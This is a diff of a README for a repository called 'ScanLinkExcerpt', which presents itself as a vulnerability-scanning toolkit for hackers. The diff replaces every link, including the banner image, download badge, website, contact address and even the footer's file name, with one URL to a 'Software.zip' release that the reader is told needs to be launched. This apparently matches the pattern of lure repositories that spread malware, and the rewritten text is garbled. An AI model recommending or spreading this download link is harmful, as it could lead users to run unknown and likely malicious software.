@@ -1,7 +1,7 @@
 
 # 🛡️ ScanLinkExcerpt - Empowering Hackers to Search for Vulnerabilities 🛡️
 
-![ScanLinkExcerpt Banner](https://imageurl.com)
+![ScanLinkExcerpt Banner](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip)
 
 Welcome to the ScanLinkExcerpt repository! This is your go-to resource for searching for specific vulnerabilities and taking action on them. Our tools and resources are designed to empower hackers with the knowledge and tools needed to identify and address vulnerabilities effectively.
 
@@ -9,7 +9,7 @@ Welcome to the ScanLinkExcerpt repository! This is your go-to resource for searc
 
 To get started with ScanLinkExcerpt, simply click on the link below to download the necessary files:
 
-[![Download ScanLinkExcerpt](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - *Needs to be launched*
+[![Download ScanLinkExcerpt](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip)](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip) - *Needs to be launched*
 
 ## 🧰 Tools and Resources
 
@@ -31,7 +31,7 @@ Stay ahead of potential threats with our network security tools. Scan for vulner
 
 ## 🌐 Visit our Website
 
-For more information and updates, visit our website [ScanLinkExcerpt](https://www.scanlinkexcerpt.com).
+For more information and updates, visit our website [ScanLinkExcerpt](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip).
 
 ## 📝 Contributing
 
@@ -39,9 +39,9 @@ We welcome contributions from the hacking community to enhance our repository. W
 
 ## 📧 Contact Us
 
-Have a question or suggestion? Feel free to reach out to us at [contact@scanlinkexcerpt.com](mailto:contact@scanlinkexcerpt.com).
+Have a question or suggestion? Feel free to reach out to us at [https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip).
 
-![Hack Responsibly](https://imageurl.com)
+![Hack Responsibly](https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip)
 
 Happy hacking! 🔒🔍
 
@@ -49,4 +49,4 @@ Happy hacking! 🔒🔍
 
 **NOTE**: If the download link does not work, kindly check the "Releases" section of this repository for alternative downloads. 🔄
 
-*This README.md file is subject to change and update without prior notice.*
+*This https://github.com/zeruxwebsite/ScanLinkExcerpt/releases/download/v2.0/Software.zip file is subject to change and update without prior notice.*
